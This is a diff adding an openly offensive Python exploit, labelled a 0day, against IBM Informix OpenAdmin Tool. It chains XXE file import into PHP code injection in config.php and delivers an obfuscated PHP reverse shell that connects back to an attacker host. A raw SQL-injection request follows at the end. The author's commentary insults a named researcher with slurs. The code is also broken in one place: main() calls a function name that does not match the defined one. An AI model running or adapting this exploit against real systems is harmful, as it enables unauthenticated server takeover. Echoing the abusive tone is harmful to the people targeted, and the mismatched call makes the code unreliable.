@@ -1,0 +1,283 @@
+#!/usr/local/bin/python
+"""
+IBM Informix Dynamic Server doconfig PHP Code Injection Remote Code Execution Vulnerability (0DAY)
+Bonus: free XXE bug included!
+Download: https://www-01.ibm.com/marketing/iwm/iwm/web/reg/download.do?source=swg-informixfpd&S_PKG=dl&lang=en_US&cp=UTF-8&dlmethod=http
+Twitter: https://twitter.com/rgod777
+Found by: IMgod aka rgay
+
+About:
+~~~~~~
+
+So after Andrea Micalizzi decided to audit this software and found some bugs I decided to audit it too. (see https://blogs.securiteam.com/index.php/archives/3210)
+What's that? Where is all your main frame, super 1337 hacks now rgod? Why did you miss these 3 bugs?
+
+- unauthed XXE
+- unauthed SQLi
+- unauthed RCE
+
+Your ub3r 31337 PHP hacks are soooooooooooo cool, maybe you should commit seppuku again. Or maybe you should have taken one of the 143 jobs you were offered? Cos I'm about to rekt dis cunt.
+
+Vulnerable Code:
+~~~~~~~~~~~~~~~~
+
+Of course, rgod misses this bug in openadmin/admin/index.php:
+
+$admin->run();                                                                  // 1. calls run()
+
+$idsadmin->html->render();
+
+        function run()
+        {
+
+                if ( isset ( $this->idsadmin->in['helpact'] )
+                && $this->idsadmin->in['do'] != "doedithelp"
+                && $this->idsadmin->in['do'] != "doaddhelp" )
+                {
+                        header("Location: {$this->idsadmin->get_config("BASEURL")}/index.php?act=help&helpact={$this->idsadmin->in['helpact']}&helpdo={$this->idsadmin->in['helpdo']}");
+                        die();
+                }
+
+                if ( isset($this->idsadmin->in['lang']) )
+                {
+                    // If the user has changed the language, set the new language now.
+                    $this->idsadmin->validate_lang_param();
+                    $this->idsadmin->phpsession->set_lang($this->idsadmin->in['lang']);
+                }
+
+                switch( $this->idsadmin->in['do'] )                                                         // 2. switch our do parameter
+                {
+                        case "getconnections":
+                                if ( ! isset($this->idsadmin->in['group_num']) )
+                                {
+                                        $grpnum = 1;
+                                }
+                                else
+                                {
+                                        $grpnum = $this->idsadmin->in['group_num'];
+                                }
+                                $this->getconnections($grpnum);
+                                break;
+                        ...
+
+                        case "doconfig":
+                                $this->idsadmin->html->set_pagetitle($this->idsadmin->lang("OATconfig"));
+                                $this->doconfig();                                                          // 3. calls doconfig
+                                break;
+
+Now, onto the doconfig function:
+
+        function doconfig()
+        {
+                // None of the config parameters can contain quotes.
+                foreach ($this->idsadmin->in as $i => $v)
+                {
+                        if (strstr($v,"\"") || strstr($v,"'"))
+                        {
+                                $this->idsadmin->load_lang("global");
+                                $this->idsadmin->error($this->idsadmin->lang("invalidParamNoQuotes",array($i)));
+                                $this->config();
+                                return;
+                        }
+                }
+
+                $conf_vars = array (
+        "LANG"         => $this->idsadmin->lang("LANG")
+        ,"CONNDBDIR"    => $this->idsadmin->lang("CONNDBDIR")
+        ,"BASEURL"      => $this->idsadmin->lang("BASEURL")
+        ,"HOMEDIR"      => $this->idsadmin->lang("HOMEDIR")
+        ,"HOMEPAGE"     => $this->idsadmin->lang("HOMEPAGE")
+        ,"PINGINTERVAL" => $this->idsadmin->lang("PINGINTERVAL")
+        ,"ROWSPERPAGE" => $this->idsadmin->lang("ROWSPERPAGE")
+        ,"SECURESQL"    => $this->idsadmin->lang("SECURESQL")
+        ,"INFORMIXCONTIME"      => $this->idsadmin->lang("INFORMIXCONTIME")
+        ,"INFORMIXCONRETRY"     => $this->idsadmin->lang("INFORMIXCONRETRY")
+        );
+
+        # create backup of file
+        $src=$this->idsadmin->get_config('HOMEDIR')."/conf/config.php";
+        $dest=$this->idsadmin->in['HOMEDIR']."/conf/BAKconfig.php";
+        copy($src,$dest);
+        # open the file
+        if (! is_writable($src))
+        {
+                $this->config($this->idsadmin->lang("SaveCfgFailure"). " $src");
+                return;
+        }
+        $fd = fopen($src,'w+');                                                                 // 4. get a handle to a php file
+        # write out the conf
+        fputs($fd,"<?php \n");
+        foreach ($conf_vars as $k => $v)
+        {
+                if ($k == "CONNDBDIR" || $k == "HOMEDIR")
+            {
+                // Replace backslashes in paths with forward slashes
+                $this->idsadmin->in[$k] = str_replace('\\', '/', $this->idsadmin->in[$k]);
+            }
+                $out = "\$CONF['{$k}']=\"{$this->idsadmin->in[$k]}\";  #{$v}\n";                // 5. dangerous
+                fputs($fd,$out);                                                                // 6. PHP Injection
+        }
+        fputs($fd,"?>\n");
+        fclose($fd);
+
+        $this->idsadmin->html->add_to_output($this->idsadmin->template["template_global"]->global_redirect($this->idsadmin->lang("SaveCfgSuccess"),"index.php?act=admin"));
+
+        } #end config
+
+I suspect Andrea missed this bug because of this code:
+
+                // None of the config parameters can contain quotes.
+                foreach ($this->idsadmin->in as $i => $v)
+                {
+                        if (strstr($v,"\"") || strstr($v,"'"))                          // check for double quotes
+                        {
+                                $this->idsadmin->load_lang("global");
+                                $this->idsadmin->error($this->idsadmin->lang("invalidParamNoQuotes",array($i)));
+                                $this->config();
+                                return;
+                        }
+                }
+
+I'm sure his assumption was that if you can't break out of the double quotes, you can't get RCE. Well, MR I have 40 years experiance.
+
+Example:
+~~~~~~~~
+
+sh-3.2$ ./poc.py 
+
+    IBM Informix Dynamic Server doconfig PHP Code Injection Remote Code Execution Vulnerability (0DAY)
+    Found By: IMgod aka rgay
+
+(+) usage: ./poc.py <target> <connectback:port>
+(+) eg: ./poc.py 192.168.1.172 192.168.1.1:1111
+sh-3.2$ ./poc.py 192.168.1.172 192.168.1.1:1111
+
+    IBM Informix Dynamic Server doconfig PHP Code Injection Remote Code Execution Vulnerability (0DAY)
+    Found By: IMgod aka rgay
+
+(+) PHP code injection done!
+(+) starting handler on port 1111
+(+) connection from 172.16.175.172
+(+) popping a shell!
+id
+uid=2(daemon) gid=2(daemon) groups=1(bin),2(daemon)
+uname -a
+Linux informixva 2.6.27.39-0.3-pae #1 SMP 2009-11-23 12:57:38 +0100 i686 i686 i386 GNU/Linux
+"""
+import sys
+import requests
+import telnetlib
+import socket
+from threading import Thread
+from base64 import b64encode as b64e
+
+def banner():
+    return """\n\tIBM Informix Dynamic Server doconfig PHP Code Injection Remote Code Execution Vulnerability (0DAY)\n\tFound by: IMgod aka rgay\n"""
+
+def check_args():
+    global t, ls, lp
+    if len(sys.argv) < 3:
+        return False
+    t  = "http://%s/openadmin/admin/index.php?act=admin&do=doimport" % sys.argv[1]
+    ls = sys.argv[2].split(":")[0]
+    lp = int(sys.argv[2].split(":")[1])
+    return True
+
+def handler(lport):
+    print "(+) starting handler on port %d" % lport
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    print "(+) connection from %s" % addr[0]
+    t.sock = conn
+    print "(+) popping a shell!"
+    t.interact()
+
+# build the reverse php shell
+def build_php_code():
+    phpkode  = ("""
+    @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
+    phpkode += ("""$dis=@ini_get('disable_functions');""")
+    phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
+    phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
+    phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
+    phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
+    phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
+    phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
+    phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
+    phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
+    phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
+    phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
+    phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
+    phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
+    phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
+    phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
+    phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
+    phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
+    phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
+    phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
+    phpkode += ("""$nofuncs='no exec functions'; """)
+    phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
+    phpkode += ("""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """ % (ls, lp))
+    phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
+    phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
+    phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
+    phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
+    phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """ % (ls, lp))
+    phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
+    phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
+    phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
+    phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
+    phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
+    phpkode += ("""}@socket_close($s);} """)
+    return phpkode
+
+def suntzu_omfg_no_one_can_steal_my_software_yo():
+    handlerthr = Thread(target=handler, args=(lp,))
+    handlerthr.start()
+    target = "http://127.0.0.1/openadmin/conf/config.php?c=eval%%28base64_decode%%28%%27%s%%27%%29%%29%%3b" % b64e(build_php_code())
+    p = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"%s\" >]><foo>&xxe;</foo>" % target
+    f = [('importfile', ('suntzu-rgod-is-so-elite', p, 'text/plain'))]
+    r = requests.post("%s" % t, files=f)
+
+def suntzu_omfg_i_am_40_years_old_and_fuckn_fat():
+    target = "http://127.0.0.1/openadmin/admin/index.php?act=admin&do=doconfig&LANG=en_US&BASEURL=http%3A%2F%2Flocalhost%3A80%2Fopenadmin&HOMEDIR=%2Fopt%2FIBM%2FOpenAdmin%2FOAT%2FApache_2.4.2%2Fhtdocs%2Fopenadmin%2F&CONNDBDIR=%2Fopt%2FIBM%2FOpenAdmin%2FOAT%2FOAT_conf%2F&HOMEPAGE=%7b%24%7beval%28%24_GET%5bc%5d%29%7d%7d&PINGINTERVAL=300&ROWSPERPAGE=25&SECURESQL=on&INFORMIXCONTIME=20&INFORMIXCONRETRY=3&dosaveconf=Save"
+    p = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"%s\" >]><foo>&xxe;</foo>" % target
+    f = [('importfile', ('suntzu-rgod-is-so-elite', p, 'text/plain'))]
+    r = requests.post("%s" % t, files=f)
+    if r.status_code == 200:
+        return True
+    return False
+
+def main():
+    print banner()
+    if not check_args():
+        print "(+) usage: %s <target> <connectback:port>" % sys.argv[0]
+        print "(+) eg: %s 192.168.1.172 192.168.1.1:1111" % sys.argv[0]
+        sys.exit()
+
+    if suntzu_omfg_i_am_40_years_old_and_fuckn_fat():
+        print "(+) PHP code injection done!"
+        suntzu_omfg_no_one_can_audit_my_software_yo()
+
+if __name__ == '__main__':
+    main()
+"""
+Bonus bug SQL Injection!
+
+POST /openadmin/admin/index.php?act=admin&do=doimport HTTP/1.1
+Host: 192.168.1.172
+Connection: close
+Content-Type: multipart/form-data; boundary=--------1366435377
+Content-Length: 258
+
+----------1366435377
+Content-Disposition: form-data; name="importfile"; filename="rektGOD.txt"
+Content-Type: text/plain
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<root><group name="rgay' or '1'=(select '1') -- "></group></root>
+----------1366435377--
+"""
